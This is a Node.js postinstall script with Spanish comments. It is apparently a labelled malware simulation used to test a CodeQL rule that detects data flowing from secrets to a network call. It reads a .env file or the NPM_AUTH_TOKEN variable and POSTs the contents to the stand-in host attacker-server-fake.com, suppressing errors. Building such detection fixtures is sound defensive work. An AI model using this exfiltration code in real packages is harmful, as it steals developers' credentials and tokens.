const fs = require('fs');
const path = require('path');
const https = require('https');

console.log("[Sandbox] Ejecutando script de postinstall (simulación de malware)...");

const envPath = path.join(__dirname, '.env');
let stolenData = "";

// 1. Buscamos credenciales en el fichero físico o en memoria
if (fs.existsSync(envPath)) {
    console.log("[Sandbox] Archivo .env detectado. Leyendo credenciales...");
    stolenData = fs.readFileSync(envPath, 'utf8');
} else if (process.env.NPM_AUTH_TOKEN) {
    console.log("[Sandbox] Leyendo token de NPM directamente del entorno...");
    stolenData = process.env.NPM_AUTH_TOKEN;
}

// 2. Simulación de la exfiltración
if (stolenData) {
    console.log("[Sandbox] Secretos capturados. Iniciando petición de salida...");

    // Montamos una petición HTTP falsa. El dominio no existe, pero necesitamos 
    // hacer la llamada para que CodeQL detecte el flujo de datos (source -> sink)
    const req = https.request({
        hostname: 'attacker-server-fake.com',
        port: 443,
        path: '/drop',
        method: 'POST'
    }, (res) => {
        // En un ataque real leeríamos la respuesta del C&C aquí
    });

    // Ignoramos el error de DNS para no ensuciar los logs de GitHub Actions
    req.on('error', () => {});

    // Inyectamos los secretos en el body (esto es lo que detecta la regla QL)
    req.write(JSON.stringify({ payload: stolenData }));
    req.end();
    
    console.log("[Sandbox] Exfiltración ejecutada.");
} else {
    console.log("[Sandbox] No se encontraron secretos para exfiltrar.");
}